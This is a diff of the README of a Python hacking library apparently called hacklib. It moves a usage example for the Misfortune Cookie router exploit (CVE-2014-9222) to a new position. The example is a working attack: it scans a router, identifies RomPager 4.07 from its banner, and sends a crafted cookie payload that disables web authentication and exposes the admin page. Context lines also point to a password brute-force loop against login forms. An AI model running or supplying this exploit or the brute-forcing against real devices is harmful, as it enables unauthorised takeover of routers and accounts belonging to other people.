@@ -27,6 +27,34 @@ if ps.portOpen(80):
     # Establish a TCP stream and sends a message
     send(getIP('yourwebsite.com'), 80, message='GET HTTP/1.1 \r\n')
 ```
+
+Misfortune Cookie Exploit (CVE-2014-9222):
+```python
+>>> import hacklib
+
+# Discovery
+>>> ps = hacklib.PortScanner()
+>>> ps.scan('192.168.1.1', 81)
+Port 80:
+HTTP/1.1 404 Not Found
+Content-Type: text/html
+Transfer-Encoding: chunked
+Server: RomPager/4.07 UPnP/1.0
+EXT:
+# The banner for port 80 shows us that the server uses RomPager 4.07. This version is exploitable.
+
+# Exploitation
+>>> payload = '''GET /HTTP/1.1
+Host: 192.168.1.1
+User-Agent: googlebot
+Accept: text/html, application/xhtml+xml, application/xml; q=09, */*; q=0.8
+Accept-Language: en-US, en; q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: C107351277=BBBBBBBBBBBBBBBBBBBB\x00''' + '\r\n\r\n'
+>>> hacklib.send('192.168.1.1', 80, payload)
+# The cookie replaced the firmware's Assembly code for web authentication with a null bye.
+# The router's admin page is now fully accessible from any web browser.
+```
 -
 Universal Login for almost all HTTP/HTTPS form-based logins and HTTP Basic Authentication logins:
 
@@ -62,34 +90,4 @@ for p in passwords:
         print 'Password is', p
         break
     # For HTTP Basic Authentication logins, simply use 'if htmldata:'
-```
--
-#### Combining the Tools
--
-Misfortune Cookie Exploit (CVE-2014-9222):
-```python
->>> import hacklib
-
-# Discovery
->>> ps = hacklib.PortScanner()
->>> ps.scan('192.168.1.1', 81)
-Port 80:
-HTTP/1.1 404 Not Found
-Content-Type: text/html
-Transfer-Encoding: chunked
-Server: RomPager/4.07 UPnP/1.0
-EXT:
-# The banner for port 80 shows us that the server uses RomPager 4.07. This version is exploitable.
-
-# Exploitation
->>> payload = '''GET /HTTP/1.1
-Host: 192.168.1.1
-User-Agent: googlebot
-Accept: text/html, application/xhtml+xml, application/xml; q=09, */*; q=0.8
-Accept-Language: en-US, en; q=0.5
-Accept-Encoding: gzip, deflate
-Cookie: C107351277=BBBBBBBBBBBBBBBBBBBB\x00''' + '\r\n\r\n'
->>> hacklib.send('192.168.1.1', 80, payload)
-# The cookie replaced the firmware's Assembly code for web authentication with a null bye.
-# The router's admin page is now fully accessible from any web browser.
 ```
